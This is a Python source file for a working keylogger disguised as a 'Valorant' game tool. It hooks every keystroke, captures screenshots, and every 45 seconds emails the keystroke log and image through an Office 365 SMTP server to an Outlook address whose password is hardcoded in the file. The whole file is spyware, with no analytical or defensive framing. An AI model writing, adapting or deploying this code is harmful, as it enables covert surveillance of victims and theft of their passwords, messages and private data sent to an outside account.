import keyboard
import smtplib
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.text import MIMEText
from mss import mss

CADENCE = 45
ADDRESS = "keylogger__@outlook.com"
PASSWORD = "#error123"

class Valorant:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name
    
    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def sendmail(self, email, password, message, verbose=1):
        
        screenshot = './windows.png'
        msg = MIMEMultipart()
        msg["From"] = ADDRESS
        msg["To"] = ADDRESS
        msg["Subject"] = str(f"Valorant Stats {datetime.now()}")
        
        with mss() as sct:
            sct.shot(output=screenshot)

        img_data=""
        with open(screenshot, 'rb') as f:
            img_data = f.read()

        image = MIMEImage(img_data)
        text_part = MIMEText(message, "plain")
        msg.attach(text_part)
        msg.attach(image)
        server = smtplib.SMTP(host="smtp.office365.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, msg.as_string())
        server.quit()


    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(ADDRESS, PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
                print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

    
if __name__ == "__main__":
    Omen = Valorant(interval=CADENCE, report_method="email")
    Omen.start()